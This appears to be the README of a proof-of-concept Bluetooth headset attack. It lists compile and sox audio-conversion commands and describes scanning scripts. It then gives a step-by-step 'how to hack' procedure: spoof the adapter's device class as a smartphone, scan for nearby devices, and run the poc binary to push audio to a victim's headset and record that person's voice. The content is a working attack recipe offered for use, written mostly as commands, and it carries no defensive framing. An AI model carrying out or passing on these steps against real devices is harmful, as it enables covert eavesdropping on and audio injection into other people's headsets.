# Set up
## 1. Compile `poc.c`
- Command
   ```bash
   gcc -o poc poc.c -lbluetooth 
   ```
   
## 2. Convert `raw` file to `wav` file
- Command
   ```bash
   sox -b 16 -s -c 1 -r 8100 -t raw [in.raw] [out.wav]
   ```   
## 3. Convert `wav` file to `raw` file
- Command
   ```bash
   sox --bits 16 --encoding signed-integer --endian little [in.wav] [out.raw]
   ```


# File info
- btScan.py
  - Locate the Bluetooth device nearby.
  - However, the device must have the search function turned on.
- rfcommScan.py
  - Search for open channels in the rfcomm protocol.
  - In my case, I have only 4 earset channels, so I only scan channel four.
- poc
  - Send a voice message to the Bluetooth earset 
  - and receive the other person's voice message.


# how to hack the bluetooth earset
1. Turn on the my bt-device
   ```bash
   sudo hciconfig hci0 up
   ```
2. In order to hack the earset, the class information of the device is changed. (class info: [link](http://bluetooth-pentest.narod.ru/software/bluetooth_class_of_device-service_generator.html))
   ```bash
   hciconfig -a
   hciconfig hci0 class 0x50020c # (class-SmartPhone, telephony, ObjectTransfer)
   ```
   
4. Locate the Bluetooth device nearby.
   ```bash
   hcitool scan
   ```
5. send voice to victim from hacker.
   ```bash
   ./poc <hci#> <messagefile> <recordfile> <bdaddr> [channel]
   ```
6. And then if you recieve a some data, you have to convert file from `raw` file to `wav`file
   ```bash
   sox -b 16 -s -c 1 -r 8100 -t raw [in.raw] [out.wav]
   ```
